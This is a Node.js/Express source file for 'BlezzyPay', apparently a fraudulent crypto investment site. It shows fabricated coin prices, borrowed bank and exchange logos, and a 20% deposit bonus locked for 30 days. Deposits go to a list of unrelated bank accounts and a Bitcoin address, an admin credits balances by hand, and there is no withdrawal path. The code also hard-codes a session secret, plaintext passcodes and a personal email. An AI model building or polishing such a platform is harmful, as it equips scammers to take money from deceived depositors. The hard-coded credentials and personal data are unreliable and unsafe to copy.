const express = require('express');
const session = require('express-session');
const PDFDocument = require('pdfkit'); 
const app = express();

// --- 1. CONFIGURATION ---
app.use(express.urlencoded({ extended: true }));
app.use(session({ 
    secret: 'blezzy_secret_key_2026', 
    resave: false, 
    saveUninitialized: true 
}));

// --- 2. DATABASE ---
const users = [
    {
        id: "admin_1",
        email: "emmanuel.iyere84@gmail.com", 
        passcode: "1234",
        isAdmin: true,
        transactions: []
    },
    {
        id: "user_1",
        email: "user@test.com",
        passcode: "1111",
        balance: 0,
        agtTokens: 0,
        lockedBonus: 0,
        bonusUnlockDate: null,
        isAdmin: false,
        transactions: [],
        pendingDeposit: null
    }
];

// Helpers
const findUser = (id) => users.find(u => u.id === id);
const findUserByEmail = (email) => users.find(u => u.email.trim().toLowerCase() === email.trim().toLowerCase());

// --- 3. AUTH ROUTES ---
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html><html><head><title>Login</title><meta name="viewport" content="width=device-width, initial-scale=1">
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
        <style>body{background:#0f1216;color:white;font-family:'Inter',sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
        .box{background:#1c2026;padding:40px;border-radius:20px;text-align:center;width:100%;max-width:350px;}
        input{width:100%;padding:15px;margin:10px 0;background:#0b0e11;border:1px solid #333;color:white;border-radius:8px;box-sizing:border-box}
        button{width:100%;padding:15px;background:#f0b90b;border:none;font-weight:bold;border-radius:8px;cursor:pointer;margin-top:10px}
        </style></head><body><div class="box"><h2 style="color:#f0b90b">BlezzyPay</h2><form action="/login" method="POST">
        <input type="email" name="email" placeholder="Email" required><input type="password" name="passcode" placeholder="Passcode" required>
        <button>LOGIN</button></form></div></body></html>
    `);
});

app.post('/login', (req, res) => {
    const user = findUserByEmail(req.body.email);
    if (user && user.passcode === req.body.passcode.trim()) {
        req.session.userId = user.id;
        if(user.isAdmin) return res.redirect('/admin');
        return res.redirect('/dashboard');
    }
    res.send(`Invalid Credentials. <a href='/'>Try Again</a>`);
});

// --- 4. DASHBOARD ---
app.get('/dashboard', (req, res) => {
    if (!req.session.userId) return res.redirect('/');
    const user = findUser(req.session.userId);
    if (user.isAdmin) return res.redirect('/admin');

    let bonusStatus = user.bonusUnlockDate && new Date() >= user.bonusUnlockDate ? "Unlocked" : "Locked (30 Days)";

    res.send(`
        <!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1">
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            body{background:#0f1216;color:white;font-family:'Inter',sans-serif;margin:0;padding-bottom:80px}
            .ticker-wrap{width:100%;overflow:hidden;background:#1e2329;color:#f0b90b;padding:12px 0;position:sticky;top:0;z-index:50}
            .ticker{display:flex;white-space:nowrap;animation:ticker 30s linear infinite}
            .ticker-item{padding:0 30px;font-size:13px;font-weight:bold;color:#4caf50}
            @keyframes ticker{0%{transform:translateX(0)}100%{transform:translateX(-100%)}}
            .logo-slider{display:flex;width:200%;animation:scroll 40s linear infinite;background:#000;padding:20px 0}
            .partner-logo{height:30px;margin:0 20px;filter:grayscale(100%);opacity:0.6}
            @keyframes scroll{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}
            .card{background:#1c2026;padding:20px;border-radius:20px;margin-bottom:20px}
            .wa-float{position:fixed;bottom:20px;right:20px;background:#25D366;color:white;width:60px;height:60px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:30px;text-decoration:none;z-index:100}
        </style></head><body>
        
        <div class="ticker-wrap"><div class="ticker">
            <div class="ticker-item">BTC: $98,420</div><div class="ticker-item">ETH: $3,200</div>
            <div class="ticker-item">XRP: $1.10</div><div class="ticker-item">USDT: $1.00</div>
            <div class="ticker-item">BTC: $98,420</div><div class="ticker-item">ETH: $3,200</div>
        </div></div>

        <div class="logo-slider">
            <img src="https://logo.clearbit.com/goldmansachs.com" class="partner-logo">
            <img src="https://logo.clearbit.com/jpmorganchase.com" class="partner-logo">
            <img src="https://logo.clearbit.com/coinbase.com" class="partner-logo">
            <img src="https://logo.clearbit.com/revolut.com" class="partner-logo">
            <span style="color:#555;font-size:10px;font-weight:bold;margin:0 10px;align-self:center">BANCO DE MOZAMBIQUE</span>
        </div>

        <div style="padding:20px">
            <div style="display:flex;justify-content:space-between;margin-bottom:20px">
                <h3>Welcome</h3><a href="/logout" style="color:#f44336">Logout</a>
            </div>

            ${user.pendingDeposit ? `<div style="background:#e67e22;padding:15px;border-radius:10px;margin-bottom:20px">
                <strong>Pending: $${user.pendingDeposit.amount}</strong> <a href="/pay-now" style="color:white;font-weight:bold">PAY NOW</a>
            </div>` : ''}

            <div class="card" style="background:linear-gradient(135deg,#1c2026,#252a33)">
                <div style="color:#888">Total Portfolio</div>
                <div style="font-size:36px;font-weight:bold">$${(user.balance + user.lockedBonus).toFixed(2)}</div>
                <div style="font-size:11px;background:#333;padding:5px 10px;border-radius:15px;display:inline-block">AGT: ${user.agtTokens}</div>
            </div>

            <div class="card" style="background:#1a382e;border:1px solid #2ecc71">
                <div style="color:#a3e6c2">30-Day Locked Bonus</div>
                <div style="font-size:24px;font-weight:bold">$${user.lockedBonus.toFixed(2)}</div>
                <div style="font-size:12px;color:#a3e6c2">${bonusStatus}</div>
            </div>

            <div class="card">
                <form action="/initiate-deposit" method="POST">
                    <input type="number" name="amount" placeholder="Deposit Amount ($)" required style="width:100%;padding:12px;background:#000;border:1px solid #444;color:white;border-radius:10px;margin-bottom:10px">
                    <button style="width:100%;padding:15px;background:#f0b90b;border:none;border-radius:10px;font-weight:bold">DEPOSIT & CLAIM 20%</button>
                </form>
            </div>

            <h3>History</h3>
            ${user.transactions.map(t => `<div style="padding:10px 0;border-bottom:1px solid #333;display:flex;justify-content:space-between">
                <div>${t.type}<br><small style="color:#666">${t.date}</small></div><div style="color:#4caf50">+$${t.amount}</div>
            </div>`).join('')}
        </div>
        <a href="https://wa.me/46704406175" class="wa-float" target="_blank"><i class="fa-brands fa-whatsapp"></i></a>
    </body></html>`);
});

// --- 5. DEPOSIT FLOW ---
app.post('/initiate-deposit', (req, res) => {
    if (!req.session.userId) return res.redirect('/');
    const user = findUser(req.session.userId);
    user.pendingDeposit = { amount: parseFloat(req.body.amount), status: "Waiting", date: new Date() };
    res.redirect('/pay-now');
});

app.get('/pay-now', (req, res) => {
    if (!req.session.userId) return res.redirect('/');
    const user = findUser(req.session.userId);
    if (!user.pendingDeposit) return res.redirect('/dashboard');

    res.send(`
        <!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1">
        <style>body{background:#0f1216;color:white;font-family:sans-serif;padding:20px}
        .box{background:#1c2026;padding:20px;border-radius:10px;margin-bottom:10px;border:1px solid #333}
        .hl{color:#f0b90b;font-weight:bold}</style></head><body>
        <div style="max-width:600px;margin:0 auto">
            <h1 style="text-align:center;color:#f0b90b">$${user.pendingDeposit.amount}</h1>
            <p style="text-align:center;color:#888">Pay to one account below:</p>

            <div class="box"><span class="hl">US Bank:</span> Bank of America | Acct: 026009593</div>
            <div class="box"><span class="hl">EU Bank:</span> Barclay | Hillside (Sports) GP | GB33BARC20658259151311 | Ref: infogloirebanco</div>
            <div class="box"><span class="hl">Uganda:</span> Equity Bank | 1003103498481 | Ref: Annet</div>
            <div class="box"><span class="hl">South Africa:</span> Capitek | 1882242481 | Ref: BlezzyPay</div>
            <div class="box"><span class="hl">Bitcoin:</span> bc1qn4ajq8fppd3derk8a24w75jkk94pjynn063gm7</div>

            <form action="/confirm-payment-sent" method="POST">
                <button style="width:100%;padding:15px;background:#4caf50;color:white;border:none;border-radius:10px;font-weight:bold;margin-top:20px">I SENT PAYMENT</button>
            </form>
            <div style="text-align:center;margin-top:20px"><a href="/cancel-deposit" style="color:#f44336">Cancel</a></div>
        </div></body></html>
    `);
});

app.post('/confirm-payment-sent', (req, res) => {
    const user = findUser(req.session.userId);
    if(user.pendingDeposit) user.pendingDeposit.status = "Pending Admin";
    res.redirect('/dashboard');
});

app.get('/cancel-deposit', (req, res) => {
    findUser(req.session.userId).pendingDeposit = null;
    res.redirect('/dashboard');
});

// --- 6. ADMIN ---
app.get('/admin', (req, res) => {
    if (!req.session.userId) return res.redirect('/');
    const admin = findUser(req.session.userId);
    if (!admin.isAdmin) return res.send("Access Denied");

    const pending = users.filter(u => u.pendingDeposit && u.pendingDeposit.status === "Pending Admin");

    res.send(`
        <body style="font-family:sans-serif;padding:20px;background:#eee">
            <h1>Admin Panel</h1>
            ${pending.length === 0 ? "No pending deposits." : ""}
            ${pending.map(u => `
                <div style="background:white;padding:20px;margin-bottom:10px;border-left:5px solid #f0b90b">
                    User: ${u.email} claims <strong>$${u.pendingDeposit.amount}</strong>
                    <form action="/admin/confirm" method="POST" style="margin-top:10px">
                        <input type="hidden" name="uid" value="${u.id}">
                        <button style="background:green;color:white;padding:10px">CONFIRM</button>
                    </form>
                </div>
            `).join('')}
            <br><a href="/logout">Logout</a>
        </body>
    `);
});

app.post('/admin/confirm', (req, res) => {
    const admin = findUser(req.session.userId);
    if (!admin.isAdmin) return res.redirect('/');
    
    const u = findUser(req.body.uid);
    if (u && u.pendingDeposit) {
        const amt = u.pendingDeposit.amount;
        const bonus = amt * 0.20;
        
        u.balance += amt;
        u.agtTokens += amt;
        u.lockedBonus += bonus;
        
        let unlock = new Date();
        unlock.setDate(unlock.getDate() + 30);
        u.bonusUnlockDate = unlock;

        u.transactions.push({ type: "Deposit", amount: amt, date: new Date().toLocaleDateString() });
        u.transactions.push({ type: "20% Bonus", amount: bonus, date: new Date().toLocaleDateString() });
        u.pendingDeposit = null;

        // Generate PDF
        const doc = new PDFDocument();
        console.log(`Sending Receipt to ${u.email} for $${amt}`);
        doc.text(`Receipt for ${u.email}: $${amt} + $${bonus} Bonus.`);
        doc.end();
    }
    res.redirect('/admin');
});

app.get('/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));
